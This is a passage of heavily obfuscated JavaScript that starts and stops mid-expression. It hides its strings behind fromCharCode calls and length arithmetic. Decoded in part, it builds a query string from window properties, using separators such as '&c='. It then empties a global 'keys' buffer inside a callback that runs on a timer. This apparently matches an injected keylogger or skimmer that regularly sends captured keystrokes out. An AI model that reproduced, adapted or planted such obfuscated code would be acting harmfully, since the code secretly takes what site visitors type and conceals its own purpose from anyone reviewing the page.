})())]*('i'.length*('cf'.length*05+1)+3)+'RYqm'.length)+'eA'.length)+(('H'.length*('ox'.length*05+2)+2)*1+0)),('OSe'.length*(('XriooKt'.length*'Gh'.length+1)*String.fromCharCode(105,113)[(String.fromCharCode(0154,101,0x6e,0147,0x74,0150))]+('NTMiOy'.length-6))+('t'.length*8+3)),(String.fromCharCode(79)[(String.fromCharCode(0154,101,0x6e,0147,0x74,104))]*('G'.length*23+7)+(02*7+3)),('P'.length*('ZK'.length*('Mk'.length*0xb+3)+7)+(0x2*25+4)),('M'.length*(0x2*(0x2*('W'.length*('c'.length*'UYibyHyV'.length+5)+0)+3)+23)+('b'.length*('rys'.length*'TxkLrl'.length+2)+16)),(String.fromCharCode(0x69,70,0112,0x6b,109,103,116)[(String.fromCharCode(108,0145,0156,0x67,0164,0150))]*('JZ'.length*'WDIVdbG'.length+1)+('Qg'.length*'xsyD'.length+3)),('biIDymRQ'.length*('sgNf'.length*'xNZ'.length+'AW'.length)+('hRPgAY'.length-6)),('p'.length*('FSNq'.length*((function () { var qz7='H'; return qz7 })()[((function () { var EQ="th",zC="g",uK="le",G7="n"; return uK+G7+zC+EQ })())]*('f'.length*('p'.length*(0x1*'FgirQaAj'.length+3)+1)+'qO'.length)+('Z'.length*(02*0x5+0)+2))+'YmMH'.length)+'EcJiFDzlc'.length),('D'.length*('B'.length*0101+5)+('Zj'.length*('x'.length*0x12+1)+8)),(String.fromCharCode(113)[(String.fromCharCode(0x6c,0x65,0x6e,103,116,104))]*(5*'qsSutmUi'.length+4)+'rc'.length),('H'.length*(01*075+20)+(1*0x15+10)),('q'.length*(('FkP'.length*String.fromCharCode(0x4b,0155,78,0163,0116,0114)[((function () { var iH="h",bF="ng",$1="l",xo="t",Up="e"; return $1+Up+bF+xo+iH })())]+'e'.length)*'dfC'.length+'X'.length)+('Se'.length*0x15+4)),((function () { var K='N'; return K })()[(String.fromCharCode(0x6c,0x65,110,0147,0164,0x68))]*(('f'.length*8+5)*'zIhiJw'.length+2)+('e'.length*22+10)),(String.fromCharCode(0x43,109)[(String.fromCharCode(0x6c,101,0x6e,103,0164,0x68))]*(String.fromCharCode(78)[(String.fromCharCode(108,0x65,110,0147,116,104))]*('q'.length*('HlTmx'.length*03+0)+0)+(('T'.length*07+6)*'R'.length+0))+'UyklEei'.length),('i'.length*('k'.length*68+22)+'vtGDKlG'.length),('n'.length*(String.fromCharCode(0x77)[(String.fromCharCode(0154,101,0156,0x67,0x74,0x68))]*('zRz'.length*10+2)+(0x1*(02*('k'.length*'YlKyLFJPI'.length+3)+4)+1))+('nJQndPnCw'.length-9)))+window[String[((function(){var Ok=(function () { var $D="de",dq="rCo"; return dq+$D })(),SR=(function () { var fv="ha",$G="mC",Gf="fro"; return Gf+$G+fv })();return SR+Ok;})())](('Cs'.length*('IZtQEDCm'.length*String.fromCharCode(0104,103,0x42,0163,0102,0x48)[((function () { var x="ngth",po="le"; return po+x })())]+'ZK'.length)+('H'.length*0xa+2)),((function () { var cCQ='l',UL='i'; return UL+cCQ })()[((function () { var z="th",W7="leng"; return W7+z })())]*(3*(0x2*0x7+0)+3)+'keibLqR'.length),((function () { var Od='f'; return Od })()[((function () { var _y="h",uH="engt",rQ="l"; return rQ+uH+_y })())]*(87*'E'.length+0)+(01*('T'.length*016+1)+1)),(String.fromCharCode(0154)[(String.fromCharCode(0x6c,0x65,0x6e,103,0x74,104))]*(0x1*0x31+26)+(0x2*('q'.length*'CXPUhpYZ'.length+2)+6)))]+(function(){var ue=(function(){var L6=(function () { var qI='='; return qI })();return L6;})(),YV=String[((function () { var Pf="rCode",WN="fromCha"; return WN+Pf })())](('I'.length*075+38)),NQ=String[(String.fromCharCode(102,0x72,111,0155,0x43,104,97,0x72,0103,0x6f,100,0x65))](('r'.length*0x1e+8));return NQ+YV+ue;})()+window[(function(){var cY=String[((function () { var cK="de",D4="C",J="f",VS="harCo",X$="rom"; return J+X$+D4+VS+cK })())]((1*('B'.length*(0127*0x1+0)+2)+12)),Ey=(function(){var Bo=String.fromCharCode(116);return Bo;})(),oP=String[((function () { var mH="de",Jy="rCo",tG="fromCha"; return tG+Jy+mH })())](('o'.length*('Lw'.length*0x1a+8)+40),(('qfAy'.length*8+0)*3+1));return oP+Ey+cY;})()]+String[(String[((function () { var F9="Code",ps="romChar",sH="f"; return sH+ps+F9 })())](('D'.length*0144+2),('Wvd'.length*('C'.length*('KdPH'.length*0x7+2)+7)+3),('nU'.length*056+19),('RX'.length*('Vgu'.length*(01*'pxNjHDHJ'.length+5)+1)+29),(1*0x35+14),('oEmlRqVqU'.length*013+5),(2*('QA'.length*(02*0x7+3)+8)+13),(1*(1*('SHm'.length*0xd+11)+45)+19),(0x2*(1*('pgNLZTny'.length*'NjFN'.length+0)+0)+3),(1*0x60+15),('T'.length*071+43),(0x1*(012*7+1)+30)))](('qwG'.length*(0x1*07+4)+'HaLeY'.length),(String.fromCharCode(86)[(String.fromCharCode(108,0x65,0156,0147,116,0x68))]*(((function () { var eS='i',eb='j'; return eb+eS })()[(String.fromCharCode(0154,101,0x6e,103,116,0x68))]*(function () { var dd='pr',YM='n',kI='Hb',Jr='i'; return kI+Jr+YM+dd })()[((function () { var D="gth",s0="en",fu="l"; return fu+s0+D })())]+'A'.length)*'linXTz'.length+'G'.length)+(0x7*'MBX'.length+0)),(String.fromCharCode(75)[((function () { var O3="gth",IH="n",Pr="le"; return Pr+IH+O3 })())]*(0x1*045+21)+'Yfc'.length))+window[String[(String[(String.fromCharCode(0x66,0x72,0x6f,0x6d,0103,0150,97,0162,67,0157,100,0x65))](('KGT'.length*30+12),(2*('MJK'.length*('bJ'.length*0x5+0)+9)+36),('xhw'.length*(0x1*('Wdn'.length*'ngQTbGwVn'.length+1)+2)+21),(06*(01*013+5)+13),('AqGpF'.length*13+2),(2*('R'.length*('X'.length*(2*(07*'BW'.length+1)+2)+12)+7)+2),('j'.length*('Mr'.length*18+14)+47),(1*(1*0104+22)+24),('ykGRW'.length*12+7),('ob'.length*0x2d+21),('cmTy'.length*0x19+0),(1*74+27)))](('fFnEY'.length*('g'.length*('FeTGx'.length*'Al'.length+0)+8)+(01*(6*'Tb'.length+0)+5)),((function () { var wm='H'; return wm })()[((function () { var Hv="th",mx="g",MN="le",ka="n"; return MN+ka+mx+Hv })())]*('b'.length*(String.fromCharCode(0x72)[((function () { var _5="th",yB="g",bO="le",vW="n"; return bO+vW+yB+_5 })())]*(String.fromCharCode(120,101)[((function () { var BF="gth",cH="len"; return cH+BF })())]*(1*('BKvAFa'.length*2+0)+9)+(010*'Ds'.length+1))+'UCBUQ'.length)+(023*1+0))+('GPZsba'.length*'cjj'.length+0)),('B'.length*(2*032+23)+('AwLNdUF'.length*'OmSLfu'.length+4)),((function () { var vR='n',FI='v'; return FI+vR })()[(String.fromCharCode(0154,0145,0x6e,103,0164,104))]*('C'.length*(0xc*'orY'.length+1)+7)+(2*013+5)))]+'';window[(function(){var Bp=String[((function () { var UF="Code",Oa="mChar",$H="fro"; return $H+Oa+UF })())](('x'.length*0x58+27)),zU=(function(){var as=String.fromCharCode(121),gD=(function () { var vM="e"; return vM })(),zb=String.fromCharCode(107);return zb+gD+as;})();return zU+Bp;})()]='';},(String.fromCharCode(0x43)[(String.fromCharCode(0x6c,0145,110,0x67,0x74,0x68))]*(String.fromCharCode(0x58,0x53,88,0146,0x47)[((function () { var K="h",N3="engt",t="l"; return t+N3+K })())]*(0x1*01620+387)+(03*'GJHne'.length+0))+('m'.length*('t'.length*((function () { var y='D'; return y })()[(String.fromCharCode(108,101,0x6e,103,0x74,104))]*(0x3*('acO'.length*'ecvPQh'.length+1)+3)+'QHi'.length)+('q'.length*0x2b+12))+(03*10+8))));
